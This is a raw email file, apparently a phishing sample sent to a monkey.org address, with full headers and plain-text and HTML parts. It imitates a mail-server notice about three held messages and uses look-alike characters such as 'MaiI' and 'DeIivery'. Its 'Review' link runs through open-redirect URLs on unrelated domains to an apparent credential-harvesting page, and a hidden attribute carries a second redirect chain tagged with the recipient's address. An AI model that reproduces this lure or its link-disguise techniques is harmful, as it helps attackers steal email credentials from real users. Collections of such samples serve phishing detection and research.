@@ -1,0 +1,188 @@
+Return-Path: lilla.jaffery@airtanzania.co.tz
+Delivered-To: jose@monkey.org
+X-FDA: 84183703464.22.0BFB6A6
+Received: from smtp4.eganet.go.tz (smtp4.eganet.go.tz [196.192.79.145])
+	by imf18.b.hostedemail.com (Postfix) with ESMTP id C1E30120005
+	for <jose@monkey.org>; Fri,  5 Dec 2025 01:36:50 +0000 (UTC)
+Authentication-Results: imf18.b.hostedemail.com;
+	dkim=none;
+	dmarc=pass (policy=none) header.from=airtanzania.co.tz;
+	spf=pass (imf18.b.hostedemail.com: domain of lilla.jaffery@airtanzania.co.tz
+ designates 196.192.79.145 as permitted sender)
+ smtp.mailfrom=lilla.jaffery@airtanzania.co.tz
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1764898611; a=rsa-sha256;
+	cv=none;
+	b=k5fHxlyZFU2wiR6wWV1THnK1ZjASqGhDGB5OXcX/4H1VgoquQipZ1M/w45GI8HDGnztfqf
+	CwaycFu0Jl0N4bL1d09o80SAZGMipQ5cObnv5bt0GGN+tP8F0OZNBLJMZnHLo6tN5LvdXu
+	mdyDzwbhdfyn74fBC2eX5bJi+mCx54w=
+ARC-Authentication-Results: i=1;
+	imf18.b.hostedemail.com;
+	dkim=none;
+	dmarc=pass (policy=none) header.from=airtanzania.co.tz;
+	spf=pass (imf18.b.hostedemail.com: domain of lilla.jaffery@airtanzania.co.tz
+ designates 196.192.79.145 as permitted sender)
+ smtp.mailfrom=lilla.jaffery@airtanzania.co.tz
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1764898611;
+	h=from:from:sender:reply-to:subject:subject:date:date:message-id:to:to:
+	 cc:mime-version:mime-version:content-type:content-type:
+	 content-transfer-encoding:in-reply-to:references;
+	bh=WrvvGjwgoHpt9qbiZGhCXEhziHrR2GBAzrVeNp5Gq6I=;
+	b=yLgr8s/Gnz0sD4pgRJOK95vz8gV/EGkZ9qFktEksHRHAwT7s4+BMQRIdu6qlXamD/PAIC1
+	+PFgPDrpobTeHWc7PVTOBdb3eIkN+ul0XY+Kv6vSkugV7RC78dHjnxaqGMqyeKi3evVlBr
+	JYens73X1z/whQ+5q4MooJiduAEm02Q=
+From: "MaiI DeIivery Failure" <lilla.jaffery@airtanzania.co.tz>
+Subject: 3 Messages FaiIed To DeIiver
+To: <jose@monkey.org>
+Content-Type: multipart/alternative;
+ boundary="Gs5BTPG4TLahklqN3TO2UmxJqdp=_A8fkH"
+MIME-Version: 1.0
+Date: Fri, 5 Dec 2025 01:36:46 +0000
+X-Rspamd-Server: rspam10
+X-Rspamd-Queue-Id: C1E30120005
+X-Stat-Signature: nfo8f9wbkfd3i7ccj7q8hkm1qcadru8h
+X-Rspam-User: 
+X-Spam-Status: No, score=5.00
+X-HE-Tag: 1764898610-9965
+X-HE-Meta: 
+ U2FsdGVkX1/drIjzPlKSjKpw9qWma/u1/hejO+PrdrImykJUW8DdD5F3KZFQhtGNCM99s4ozU1TbEx8d/uxhS84EAuNngq0pNIDGXteit52ynfWoc9rXkdDbXDa4MqvoJVJC4lVmRXZptyLINC77EbiLW2a1NaJeUHz8eRMf0tKIgg6gdj7mEAgNVhfdI8yc//EZ7NjrbI/3t92gQexiDDcyt5hoS3yQwG00nGkma7swU+tUltECcBJjaKnEQVhWV8ZNH+TENZdq+i3+LTI3MlddIywxHGc4HL01q3yh5ImyBuvHPMrnBVBxon+cp7yuX4YUldd7mNAAJgXJHoAW38jIvOjjJkSPHlkR/bgDjUbClQbyADXG5AIik1726WgOnWyalkJtj7F8W94VtB5SzUBwtkMqt3nB8jCrNn5lYzKloQuuLmqMXySzVvE6/RxFD3vQO4BXrken8lk07tb73AYF00wymp4gWgqVBAPGL7RaHNjkwlkH8scduDm0oL0gcTCtipES8m5qKBWF8BBHDWlZPuoxA0Mw8tKty1jiwFT42ir9B8WZT3OGyBv+Oe5vE1s+gqE/3loQMBFuI0aAp1j55+WJbT5pUPOabisssD6oBtFk3KOKHMKLDIreIcBH91zZKbh+GR+7ruv8VEsphBBVDUl8byb7lIK2wXoX2iEzLSU85zVR/ZhwzMYVkQnP57q4Oh9a8zXk852xSNaPN4dpnDiScTWPiH9+ShkH5n6XmMAIuoWduM1h96koqrkXP9Fda06RW4EeKjOItcMNNcdJcEGctQrNQfKR3D0UiqfjUfAg/RT7DuuLqwopHL2jJb7M0bae/kSF5BDiS5ba1bW4jbyifd0ltsHxxrCKhfYAXAGMhQ48WEFrN7dyVjWWwhHqZdLjPMZDGbL4ihlX+QD9OvVJvrZzd8fGLuqExGjZPuWObkAkBy+oykoCu/pNKBauE696TfeUl+z18HBrqH78HGE
+ gZVVR6bnhd5r4IBG4zrL17fmvvbQCql6/KEzdJ5WzIyRB0neN5l7Ev3dwTyC1LfCXWWH40Y2o+4hxjFg1KikBB24RoJhpKd06CkyBUHrjVifO08SbJsJ8qeWe73L8PG9RacNMLIs9yl2YQSt0HkhCV+9DDL9ualAA8Rct1aVUZ7DeBEZoWwhOAO7ygetJdsYoNCpOak9Swx+iUOK5R/O1P3UsNRo0fKJdQsBIiVkXIoRHZVtrxy3wGzX6hJNVCpz4qysPy/rSAOHEilXvvC1AS2aS9xadaDT4+BORF/x/CbWlQVHiBGXzpeZfMR98YM0FcEZv8Zvm3UFfrDuVT2lMCYe5bQ==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 458
+
+This is a multi-part message in MIME format
+
+--Gs5BTPG4TLahklqN3TO2UmxJqdp=_A8fkH
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+Message from jose@monkey.org server
+
+Messages Delivery Failure
+
+The deIivery of messages was stopped by the monkey.org Mail-Server.
+As of 12/5/2025, there are 3 incoming messages on hold.
+
+Click=20
+
+Review https://veganfta.com/elt-out/?url=3Dhttps://nnfdwd45hrm6a.mocha=
+=2Eapp/#test@mail.com
+
+pending incoming e-mail messages.
+
+Thanks,
+
+MaiI Administrator
+
+--Gs5BTPG4TLahklqN3TO2UmxJqdp=_A8fkH
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html><head>
+<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf-=
+8">
+  <META name=3D"viewport" content=3D"width=3Ddevice-width, initial-sca=
+le=3D1"> <META name=3D"format-detection" content=3D"telephone=3Dno"><t=
+itle>3 Messages FaiIed To DeIiver</title>
+ </head>
+ <body style=3D"BACKGROUND-COLOR: #ffffff" bgColor=3D#ffffff> <P><tabl=
+e style=3D"FONT-SIZE: 13px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
+ONT-FAMILY: 'Courier New', monospace; BORDER-RIGHT: rgb(211,211,211) 1=
+px dotted; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: rgb(=
+211,211,211) 1px dotted; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR=
+: rgb(51,51,51); FONT-STYLE: normal; BORDER-LEFT: rgb(211,211,211) 1px=
+ dotted; ORPHANS: 2; WIDOWS: 2; BACKGROUND-COLOR: rgb(255,255,255); fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-=
+stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
+-style: initial; text-decoration-color: initial" cellSpacing=3D0 cellP=
+adding=3D0 width=3D"100%" border=3D0 cke_show_border?> <TR> <TH style=3D=
+"BORDER-TOP: rgb(211,211,211) 1px dotted; BORDER-RIGHT: rgb(211,211,21=
+1) 1px dotted; WIDTH: 2px; BACKGROUND: rgb(2,151,64); BORDER-BOTTOM: r=
+gb(211,211,211) 1px dotted; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PAD=
+DING-LEFT: 5px; BORDER-LEFT: rgb(211,211,211) 1px dotted; PADDING-RIGH=
+T: 5px"><BR></TH> <TD style=3D"FONT-SIZE: 12px; BORDER-TOP: rgb(211,21=
+1,211) 1px dotted; BORDER-RIGHT: rgb(211,211,211) 1px dotted; BACKGROU=
+ND: rgb(243,255,248); BORDER-BOTTOM: rgb(211,211,211) 1px dotted; PADD=
+ING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 5px; BORDER-LEFT: rgb=
+(211,211,211) 1px dotted; PADDING-RIGHT: 5px">Message from jose@monkey=
+=2Eorg&nbsp;server</TD></TR></TABLE></p><p style=3D"FONT-SIZE: 13px; F=
+ONT-FAMILY: 'Courier New', monospace; WHITE-SPACE: normal; WORD-SPACIN=
+G: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); =
+FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 20px 0px; BACKGROUN=
+D-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial"><BR></p><p style=3D"FONT-SIZE: 16px; FONT-FA=
+MILY: 'Courier New', monospace; WHITE-SPACE: normal; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; FONT-WEIGHT: bold; COLOR: rgb(0,0,102); FONT-S=
+TYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; BACKGROUND-COLOR: rg=
+b(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style: initial; text-decoration-c=
+olor: initial">Messages Delivery Failure</p><p style=3D"FONT-SIZE: 13p=
+x; FONT-FAMILY: 'Courier New', monospace; WHITE-SPACE: normal; WORD-SP=
+ACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,5=
+1); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 20px 0px; BACKG=
+ROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligature=
+s: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; =
+text-decoration-thickness: initial; text-decoration-style: initial; te=
+xt-decoration-color: initial"><BR></p><p style=3D"FONT-SIZE: 14px; FON=
+T-FAMILY: 'Courier New', monospace; WHITE-SPACE: normal; WORD-SPACING:=
+ 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; BACKGROUND-COLOR=
+: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decora=
+tion-thickness: initial; text-decoration-style: initial; text-decorati=
+on-color: initial">The deIivery of messages was stopped by the&nbsp;<B=
+>monkey.org</B>&nbsp;Mail-Server.<BR>As of&nbsp;<B>12/5/2025</B>, ther=
+e are&nbsp;<STRONG>3 incoming messages on hold</STRONG>.</p><p style=3D=
+"FONT-SIZE: 13px; FONT-FAMILY: 'Courier New', monospace; WHITE-SPACE: =
+normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COL=
+OR: rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: =
+20px 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stro=
+ke-width: 0px; text-decoration-thickness: initial; text-decoration-sty=
+le: initial; text-decoration-color: initial"><BR></p><p style=3D"FONT-=
+SIZE: 14px; FONT-FAMILY: 'Courier New', monospace; WHITE-SPACE: normal=
+; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; B=
+ACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-liga=
+tures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0=
+px; text-decoration-thickness: initial; text-decoration-style: initial=
+; text-decoration-color: initial">Click&nbsp;<A style=3D"CURSOR: point=
+er; COLOR: rgb(17,85,204)" href=3D"https://veganfta.com/elt-out/?url=3D=
+https://nnfdwd45hrm6a.mocha.app/#test@mail.com" target=3D_blank data-c=
+ke-saved-href=3D"https://cas.mestouvaly.cz/cas/logout?service=3Dhttps:=
+//e7midia.com/stcu/cgi/chameleon.html#jose@monkey.org">Review</A>&nbsp=
+;pending incoming e-mail messages.</p><p style=3D"FONT-SIZE: 13px; FON=
+T-FAMILY: 'Courier New', monospace; WHITE-SPACE: normal; WORD-SPACING:=
+ 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FO=
+NT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 20px 0px; BACKGROUND-=
+COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: nor=
+mal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-d=
+ecoration-thickness: initial; text-decoration-style: initial; text-dec=
+oration-color: initial"><BR></p><p style=3D"FONT-SIZE: 14px; FONT-FAMI=
+LY: 'Courier New', monospace; WHITE-SPACE: normal; WORD-SPACING: 0px; =
+TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STY=
+LE: normal; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; BACKGROUND-COLOR: rgb(=
+255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-v=
+ariant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-t=
+hickness: initial; text-decoration-style: initial; text-decoration-col=
+or: initial">Thanks,</p><p style=3D"FONT-SIZE: 14px; FONT-FAMILY: 'Cou=
+rier New', monospace; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRA=
+NSFORM: none; FONT-WEIGHT: bold; COLOR: rgb(51,51,51); FONT-STYLE: nor=
+mal; ORPHANS: 2; WIDOWS: 2; MARGIN: 10px 0px 0px; BACKGROUND-COLOR: rg=
+b(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font=
+-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
+-thickness: initial; text-decoration-style: initial; text-decoration-c=
+olor: initial">MaiI Administrator</P></body>
+ </html>
+
+--Gs5BTPG4TLahklqN3TO2UmxJqdp=_A8fkH--
+
+
